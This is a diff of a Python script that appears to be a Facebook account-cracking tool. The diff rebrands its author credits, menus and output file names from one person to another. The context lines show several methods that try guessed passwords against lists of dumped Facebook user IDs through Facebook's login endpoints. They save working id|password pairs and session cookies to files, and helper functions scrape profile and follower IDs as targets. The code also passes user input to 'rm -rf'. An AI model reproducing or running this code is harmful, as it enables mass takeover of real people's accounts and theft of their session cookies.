@@ -1,5 +1,5 @@
 #!/usr/bin/python
-#Original written By Muhmmad Sarfraz
+#Original written By Anaya Chaudhry
 
 import os,zlib
 
@@ -83,13 +83,13 @@ d8P' ?88    88P' ?8bd8P' ?88  d88   88  d8P' ?88
 88b  ,88b  d88   88P88b  ,88b ?8(  d88  88b  ,88b     
 `?88P'`88bd88'   88b`?88P'`88b`?88P'?8b `?88P'`88b    
                                      )88              
-                                    ,d8P              
+Original written By Anaya Chaudhry  ,d8P              
                                  `?888P'              
-                                 
+
 \033[1;37m------------------------------------------------
-\033[1;37m Owner   :            Muhammad Sarfraz
-\033[1;37m Facebook:            Muhammad Sarfraz
-\033[1;37m Github  :            Sarfraz-Ssb
+\033[1;37m Owner   :            Anaya Chaudhry
+\033[1;37m Facebook:            Anaya Chaudhry
+\033[1;37m Github  :            Anaya
 \033[1;37m Version :            19.8
 \033[1;37m------------------------------------------------ """
 def clear():
@@ -104,7 +104,7 @@ def result(OKs,cps):
         print(' TOTAL OK: %s' % str(len(oks)))
         print(' TOTAL CP: %s' % str(len(cps)))
         print(47*'-')
-        input("Press enter to back SSB Menu ")
+        input("Press enter to back Anaya Menu ")
         exit()
 
 def sarfraz():   
@@ -202,7 +202,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[SSB] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[Anaya] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -251,14 +251,14 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    print(f"\r{R} [Anaya-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SSB_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/SSB_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Anaya_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                     #print(f"\r{A} [Anaya-CP] {sid} | {ps} {S}")
                      cps.append(sid)
-                     open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                     open('/sdcard/Anaya_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -268,7 +268,7 @@ class main_crack():
     def methodC(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[SSB] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[Anaya] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -317,14 +317,14 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    print(f"\r{R} [Anaya-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SSB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/Anaya_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Anaya_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                    #  print(f"\r{A} [Anaya-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/Anaya_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -334,7 +334,7 @@ class main_crack():
     def methodB(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[SSB] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[Anaya] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -383,14 +383,14 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    print(f"\r{R} [Anaya-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SSB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/Anaya.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Anaya_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                    #  print(f"\r{A} [Anaya-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/Anaya_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -399,7 +399,7 @@ class main_crack():
 
     def methodD(self, sid, name, psw):
         global oks,cps,loop
-        sys.stdout.write(f"\r {S}[SSB] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+        sys.stdout.write(f"\r {S}[Anaya] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
         sys.stdout.flush()
         fs = name.split(' ')[0]
         try:
@@ -417,14 +417,14 @@ class main_crack():
                 session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': sua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                 complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                 if 'c_user' in session.cookies.get_dict():
-                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    print(f"\r{R} [Anaya-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SSB_OK.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/Anaya_OK.txt','a').write(sid+'|'+ps+'\n')
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
-                    #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                    #print(f"\r{A} [Anaya-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/Anaya_CP.txt','a').write(sid+'|'+ps+'\n')
                     break
                 else:
                     continue
@@ -536,7 +536,7 @@ def public():
             except KeyError:
                 print(f"\n{S}ID Not Found ...");pass
                 menu()
-        print(f'File Name To Dump Ids. Example /sdcard/SSB.txt') 
+        print(f'File Name To Dump Ids. Example /sdcard/Anaya.txt') 
         print(47*"-")
         filepath = input("Put File Name: ")
         os.system('rm -rf %s'%(filepath))
@@ -589,7 +589,7 @@ def follower():
         except KeyError:
             print(f"{A}ID Not Public");time.sleep(1)
             menu()
-        print(f'File Name To Dump Ids. Example /sdcard/SSB.txt') 
+        print(f'File Name To Dump Ids. Example /sdcard/Anaya.txt') 
         print(47*"-")
         filepath = input("Put File Name: ")
         os.system('rm -rf %s'%(filepath))
@@ -631,7 +631,7 @@ def sids():
     print('\033[1;37mPut limit between 1 to 10 \033[0;97m')
     limit = int(input('How many links do you want to separate?: '))
     clear()
-    print('\033[1;37mExample: /sdcard/SSB.txt\033[0;97m')
+    print('\033[1;37mExample: /sdcard/Anaya.txt\033[0;97m')
     print(47*'-')
     new_save = input('Save new file as: ')
     clear()
@@ -665,7 +665,7 @@ def cutter():
     print(47*'-')
     print("File Saved To :" + sarfraz )
     print(47*'-')
-    input(f"{S} Press Enter To Back SSB Menu ")
+    input(f"{S} Press Enter To Back Anaya Menu ")
     menu
        
 
@@ -804,7 +804,7 @@ def p_dump():
         
         srange = int(input('How many IDs do you want to add?: ' ))
         clear()
-        print(f'{S}File Name To Dump Ids. Example /sdcard/SSB.txt\n') 
+        print(f'{S}File Name To Dump Ids. Example /sdcard/Anaya.txt\n') 
         filepath = input("Put File Name: ")
         apnd = open(filepath , 'a')
         clear()
@@ -827,7 +827,7 @@ def p_dump():
         print(f"Total IDs: {totaldmp} ")
         print(f"File Saved To  {filepath} ")
         print(47*'-')
-        input("Press enter to back SSB Menu ")
+        input("Press enter to back Anaya Menu ")
         SSB(allkey)
     except Exception as e:
         print("Error : %s"%e) 
@@ -845,7 +845,7 @@ def cutter():
     print("Removed Successful From File: " + ssb )
     print("New File Saved:" + sarfraz )
     print(47*'-')
-    input(f"{S} Press Enter To Back SSB Menu ")
+    input(f"{S} Press Enter To Back Anaya Menu ")
     SSB(allkey)       
     
 def removef():
